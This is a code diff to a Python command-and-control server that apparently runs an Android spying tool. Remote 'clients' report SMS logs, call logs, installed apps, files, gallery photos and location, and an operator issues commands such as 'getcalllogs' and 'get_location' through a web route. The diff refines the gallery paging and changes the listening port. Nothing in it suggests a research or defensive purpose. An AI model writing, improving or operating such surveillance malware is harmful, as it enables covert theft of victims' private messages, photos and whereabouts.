@@ -45,6 +45,10 @@ def handle_incoming_data(data, client_id):
             log_type = payload.get('type', 'UNKNOWN')
             client_data = clients[client_id]['ui_data']
 
+            # Reset data on new requests
+            if log_type == 'GALLERY_PAGE_DATA':
+                client_data['gallery']['files'] = []
+
             # Simplified logic for data handling
             handler_map = {
                 'SMS_LOG': lambda p: client_data['sms_logs'].append(p.get('log')),
@@ -119,7 +123,7 @@ def handle_client_connection(conn, client_id):
 def tcp_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    tcp_port = int(os.environ.get("TCP_PORT", 9999))
+    tcp_port = int(os.environ.get("TCP_PORT", 8888))
     server.bind(('0.0.0.0', tcp_port))
     server.listen(5)
     add_log(f"[*] TCP Server listening on port {tcp_port}")
@@ -182,9 +186,13 @@ def send_command_route():
         if cmd == 'getcalllogs': client_data['call_logs'] = []
         if cmd == 'list_app': client_data['apps'] = []
         if cmd == 'filemanager' or cmd.startswith('cd '): client_data['file_manager']['files'] = []
-        if cmd == 'gallery': client_data['gallery'] = {'page': 0, 'files': [], 'view_image': None}
-        if cmd == 'gallery next': client_data['gallery']['page'] += 1
-        if cmd == 'gallery back': client_data['gallery']['page'] = max(0, client_data['gallery']['page'] - 1)
+        if cmd == 'gallery': client_data['gallery'] = {'page': 0, 'files': []}
+        if cmd == 'gallery next':
+            client_data['gallery']['page'] += 1
+            client_data['gallery']['files'] = [] # Clear files for new page
+        if cmd == 'gallery back':
+            client_data['gallery']['page'] = max(0, client_data['gallery']['page'] - 1)
+            client_data['gallery']['files'] = [] # Clear files for new page
         if cmd == 'get_location': client_data['location_url'] = None
 
     try:
@@ -198,6 +206,7 @@ def send_command_route():
 
 @app.route('/gallery_images/<path:filename>')
 def serve_gallery_image(filename):
+    # This route is no longer necessary for thumbnails but can be kept for full-size images if needed.
     return send_from_directory('gallery_downloads', filename)
 
 if __name__ == '__main__':
